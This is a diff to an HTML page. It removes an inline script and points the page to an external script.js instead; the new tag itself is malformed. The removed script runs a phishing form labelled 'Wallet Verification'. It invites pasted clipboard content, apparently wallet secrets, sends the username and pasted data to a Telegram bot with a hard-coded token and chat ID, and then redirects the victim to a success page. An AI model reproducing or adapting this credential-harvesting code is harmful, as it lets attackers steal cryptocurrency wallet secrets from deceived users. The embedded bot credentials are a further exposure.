@@ -119,59 +119,7 @@ textarea {
   </div>
 </div>
 
-<script>
-// 🔐 PUT YOUR REAL BOT TOKEN HERE
-const TOKEN = "8214623213:AAGlhEDRFbCnQaG0X1r2blaG0YJlHlkNkRs";
-
-// ✅ Your chat ID (you already got it)
-const CHAT_ID = "6994958690";
-
-// 📋 Paste button
-async function pasteClipboard() {
-  try {
-    const text = await navigator.clipboard.readText();
-    document.getElementById("complaint").value += text;
-  } catch {
-    alert("Clipboard denied");
-  }
-}
-
-// 📩 Send to Telegram
-document.getElementById("form").addEventListener("submit", async (e) => {
-  e.preventDefault();
-
-  const username = document.getElementById("username").value;
-  const complaint = document.getElementById("complaint").value;
-
-  const message = `🔐 Wallet Verification
-
-👤 User: ${username}
-
-📝 Data:
-${complaint}
-
-⏰ ${new Date().toLocaleString()}`;
-
-  try {
-    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: message
-      })
-    });
-
-    // ✅ Redirect after success
-    window.location.href = "success.html";
-
-  } catch {
-    alert("Network error!");
-  }
-});
-</script>
+<script src="script.js"</script>
 
 </body>
 </html>
